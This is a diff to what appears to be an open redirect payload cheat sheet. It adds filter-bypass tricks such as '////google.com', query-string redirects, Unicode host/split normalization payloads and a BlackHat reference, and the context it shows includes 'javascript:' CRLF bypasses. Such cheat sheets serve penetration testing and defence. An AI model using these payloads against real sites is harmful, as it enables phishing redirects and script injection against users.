@@ -21,7 +21,7 @@ https://famous-website.tld/signup?redirectUrl=https://famous-website.tld/account
 After signing up you get redirected to your account, this redirection is specified by the `redirectUrl` parameter in the URL.   
 What happens if we change the `famous-website.tld/account` to `evil-website.tld`?
 
-```powerhshell
+```powershell
 https://famous-website.tld/signup?redirectUrl=https://evil-website.tld/account
 ```
 
@@ -63,10 +63,11 @@ Using CRLF to bypass "javascript" blacklisted keyword
 java%0d%0ascript%0d%0a:alert(0)
 ```
 
-Using "//" to bypass "http" blacklisted keyword
+Using "//" & "////" to bypass "http" blacklisted keyword
 
 ```powershell
 //google.com
+////google.com
 ```
 
 Using "https:" to bypass "//" blacklisted keyword
@@ -112,6 +113,20 @@ Creating folder as their domain
 ```powershell
 http://www.yoursite.com/http://www.theirsite.com/
 http://www.yoursite.com/folder/www.folder.com
+```
+
+Using "?" characted, browser will translate it to "/?"
+
+```powershell
+http://www.yoursite.com?http://www.theirsite.com/
+http://www.yoursite.com?folder/www.folder.com
+```
+
+
+Host/Split Unicode Normalization
+```powershell
+https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
+http://a.com／X.b.com
 ```
 
 XSS from Open URL - If it's in a JS variable
@@ -165,7 +180,10 @@ http://www.example.com/redirect.php?url=javascript:prompt(1)
 ## References
 
 * filedescriptor
+* [You do not need to run 80 reconnaissance tools to get access to user accounts - @stefanocoding](https://gist.github.com/stefanocoding/8cdc8acf5253725992432dedb1c9c781)
 * [OWASP - Unvalidated Redirects and Forwards Cheat Sheet](https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet)
 * [Cujanovic - Open-Redirect-Payloads](https://github.com/cujanovic/Open-Redirect-Payloads)
 * [Pentester Land - Open Redirect Cheat Sheet](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
 * [Open Redirect Vulnerability - AUGUST 15, 2018 - s0cket7](https://s0cket7.com/open-redirect-vulnerability/)
+* [Host/Split
+Exploitable Antipatterns in Unicode Normalization - BlackHat US 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)
